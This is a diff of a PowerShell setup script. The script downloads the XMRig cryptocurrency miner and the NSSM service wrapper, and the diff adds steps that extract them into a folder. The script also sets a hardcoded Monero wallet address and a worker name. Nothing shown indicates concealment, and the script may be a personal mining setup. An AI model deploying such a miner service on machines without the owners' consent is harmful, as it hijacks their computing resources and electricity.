@@ -59,18 +59,12 @@ New-Item -ItemType Directory -Force -Path $xmrigFolder | Out-Null
 $zipUrl = "https://github.com/xmrig/xmrig/releases/download/v6.26.0/xmrig-6.26.0-windows-x64.zip"
 $zipPath = "$env:TEMP\xmrig.zip"
 Download-File $zipUrl $zipPath
-if (!(Test-Path $zipPath)) {
-    throw "xmrig.zip not found."
-}
-
+Expand-Archive -Path $zipPath -DestinationPath $xmrigFolder -Force
 $xmrigExe = Get-ChildItem -Path $xmrigFolder -Recurse -Filter "xmrig.exe" | Select-Object -First 1 -ExpandProperty FullName
 $nssmZipUrl = "https://nssm.cc/ci/nssm-2.24-101-g897c7ad.zip"
 $nssmZipPath = "$env:TEMP\nssm.zip"
 Download-File $nssmZipUrl $nssmZipPath
-if (!(Test-Path $nssmZipPath)) {
-    throw "nssm.zip not found."
-}
-
+Expand-Archive -Path $nssmZipPath -DestinationPath $xmrigFolder -Force
 $nssmExe = Get-ChildItem -Path $xmrigFolder -Recurse -Filter "nssm.exe" | Where-Object { $_.DirectoryName -like "*win64*" } | Select-Object -First 1 -ExpandProperty FullName
 $wallet = "87LVyXpW64PLompVtz6nYsULGAGckEv63CGW8euYg21VV7BB8sALsvadF1JK7E6g5VV71gJSXJcBrPEJjpjwhbX5HBUCc5s"
 $worker = "x1"
